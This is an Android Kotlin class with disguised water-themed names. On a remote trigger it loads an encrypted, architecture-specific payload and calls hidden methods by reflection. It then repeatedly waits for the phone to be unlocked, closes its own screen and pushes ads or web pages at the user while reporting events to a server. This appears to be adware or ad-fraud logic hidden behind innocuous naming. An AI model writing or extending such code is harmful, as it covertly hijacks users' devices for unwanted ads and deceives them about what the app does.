package com.water.soak

import android.app.KeyguardManager
import android.content.Context
import android.os.Build
import android.os.PowerManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withTimeoutOrNull
import java.io.File

/**
 * Date：2024/8/13
 * Describe:
 */
class DrinkWaterImpl(
    val context: Context, private val mReservoirLifeActivity: ReservoirLifeActivity
) : ConfigureChange {
    private val mCorMain = CoroutineScope(Dispatchers.Main)
    private var mRetryNum by LakeStore(def = "Y")
    var isDrink = false
    private var periodTime = 80000L
    private var lastTimeShow = 0L
    private var nameStrLi = ""
    private var isSuccess = false

    init {
//        System.loadLibrary("NsEKWH")

    }

    private fun createFile(context: Context, name: String) {
        val file = "${context.dataDir.path}/$name"
        File(file).mkdirs()
    }

    override fun changeBean(status: String, period: Long, fileString: String) {
        TideHelper.log("changeBean---$status --$period")
        periodTime = period
        if (isDrink) return
        nameStrLi = getInfoName()
        if (status.contains("spring")) {
            isDrink = true
            createFile(context, fileString)
            actionJob()
            TideHelper.mWaterNetwork.postEvent("isuser", Pair("getstring", "a"))
        } else if (status.contains("water")) {
            isDrink = false
            TideHelper.mWaterNetwork.postEvent("isuser", Pair("getstring", "b"))
        }
    }

    override fun loadAdSuccess() {
        if (isNeed) {
            isNeed = false
            TideHelper.mWaterNetwork.postList(actionCheck())
        }
    }

    override fun actionStatus(isSuccess: Boolean) {
        if (isSuccess) {
            mRetryNum = "S"
            TideHelper.mWaterNetwork.postEvent("startup")
            lastTimeShow = System.currentTimeMillis()
        } else {
            TideHelper.mWaterNetwork.postEvent("showfailer", Pair("string", "ad not ready"))
            lastTimeShow = 0
        }
    }

    private fun getInfoName(abi: String = getTypeStr()): String {
        // 根据架构选择加密文件名
        if (abi.contains("64", true)) {
            return "ice_dra_white" // 64位加密文件
        }
        return "black_tras_t" // 32位加密文件
    }

    private fun getTypeStr(): String {
        // 优先检测64位架构
        for (abi in Build.SUPPORTED_64_BIT_ABIS) {
            if (abi.startsWith("arm64") || abi.startsWith("x86_64")) {
                return abi
            }
        }
        for (abi in Build.SUPPORTED_32_BIT_ABIS) {
            if (abi.startsWith("armeabi") || abi.startsWith("x86")) {
                return abi
            }
        }
        TideHelper.log("cpu ${Build.SUPPORTED_ABIS} --${Build.SUPPORTED_64_BIT_ABIS}--${Build.SUPPORTED_32_BIT_ABIS}")
        return Build.CPU_ABI
    }

    private fun strCpu(): String {
        var str = ""
        val s = Build.SUPPORTED_ABIS
        if (s.isNotEmpty()) {
            for (sName in s) {
                str += sName
            }
        }
        return str
    }

    private fun actionJob() {
        mCorMain.launch {
//            val clazz = Class.forName("com.water.soak.SteamHelper")
//            clazz.getMethod("iceCore", Any::class.java).invoke(null, context)
            val isSuccess = SoakHelper.handSoakInfo(context, nameStrLi)
            if (isSuccess.not()) {
                TideHelper.mWaterNetwork.postEvent("action_failed", Pair("string", strCpu()))
                return@launch
            }
            delay(500)
            if (mReservoirLifeActivity.isInSp()) {
                withTimeoutOrNull(8000) {
                    while (mReservoirLifeActivity.isInSp()) {
                        delay(500)
                    }
                }
            }
            SteamHelper.getFlagByString("2")
            TideHelper.mWaterNetwork.loadAd()
            while (isDrink) {
                if (mRetryNum.length > 86) {
                    isDrink = false
                    TideHelper.mWaterNetwork.postEvent("jumpfail")
                    break
                }
                TideHelper.mWaterNetwork.postList(actionCheck())
                delay(TideHelper.mWaterNetwork.timeCheck)
            }
        }
    }

    private var isNeed = false
    private fun actionCheck(): List<String> {
        TideHelper.log("actionCheck---$mRetryNum")
        val list = arrayListOf<String>("time")
        if (isDeviceUnLocked(context).not()) return list
        list.add("isunlock")
        if (TideHelper.mWaterNetwork.isTimeWait()) return list
        if (System.currentTimeMillis() - lastTimeShow < periodTime) return list
        if (TideHelper.mCacheImpl.isLimitShowOrLoad()) return list
        list.add("ispass")
        if (TideHelper.isInH5Time()) {
            mCorMain.launch {
                mReservoirLifeActivity.finishMe()
                TideHelper.showH5Event()
            }
            return list
        }

        if (TideHelper.mWaterNetwork.isReady()) {
            TideHelper.h5Status = 99
            list.add("isready")
            isNeed = false
            if (lastTimeShow == 0L) {
                lastTimeShow = System.currentTimeMillis()
            } else {
                lastTimeShow += 5555
            }
            mCorMain.launch {
                mReservoirLifeActivity.finishMe()
                mRetryNum += ('h'..'l').random()
                delay(500)
                meGo()
            }
        } else {
            TideHelper.mWaterNetwork.loadAd()
            isNeed = true
        }
        return list
    }

    private fun isDeviceUnLocked(context: Context): Boolean {
        return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }

    private fun meGo() {
        runCatching {
            val clazz = Class.forName("com.water.soak.SteamHelper")
            clazz.getMethod("getFlagByString", String::class.java).invoke(null, "3")
        }
    }

}